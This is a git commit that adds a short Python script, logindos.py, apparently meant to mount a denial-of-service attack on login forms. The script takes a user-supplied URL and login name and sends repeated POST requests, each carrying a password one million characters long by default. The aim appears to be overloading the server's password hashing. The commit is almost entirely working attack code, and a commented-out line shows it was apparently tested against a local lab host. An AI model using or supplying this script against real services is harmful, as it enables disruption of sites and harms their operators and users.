c6993ad11878f99c710d2c4b423ff49fe7b00fcd
drawpause <drawpause@users.noreply.github.com>
2016-01-16 01:47:02 +0200

    initial commit

---
+++ logindos.py
@@ -0,0 +1,48 @@
+import sys, argparse
+import urllib.parse
+from time import sleep
+import tornado.httpclient
+
+parser = argparse.ArgumentParser(description='Description here')
+parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
+parser.add_argument('-l', '--login', dest='login', type=str, required=True,help='login')
+parser.add_argument('-s', '--size', dest='size', type=int, default=1000000, help='Size of the password')
+parser.add_argument('-d','--delay', dest='delay', type=int, default=1, help='Time between requests in seconds')
+parser.add_argument('-r','--repeats', dest='repeats', type=int, default=20, help='Number of iterations')
+
+args = parser.parse_args()
+
+#http_client = tornado.httpclient.AsyncHTTPClient()
+http_client = tornado.httpclient.HTTPClient()
+sys.stderr.write("Generating password...\n")
+password = "x" * args.size
+sys.stderr.write("Done! Password length: "+ str(len(password)) +" characters.\n")
+
+post_data = { 'login': args.login, 'password': password }
+
+body = urllib.parse.urlencode(post_data)
+
+
+req = tornado.httpclient.HTTPRequest(
+    url = args.url,
+    method = "POST",
+    body = body
+)
+
+for i in range(args.repeats):
+    sys.stderr.write("Sending password "+str(i+1)+": "+str(args.size)+" bytes\n")
+    try:
+        http_client.fetch(req)
+        #http_client.fetch("http://vagrant2016.dev/hacklogin.php", callback)
+        sleep(args.delay)
+    except Exception as e:
+        sys.stderr.write("Error: " + str(e))
+
+http_client.close()
+sys.exit()
+
+def callback(response):
+    if response.error:
+        sys.stderr.write("Error: " + response.error)
+    else:
+        sys.stderr.write(response.body)
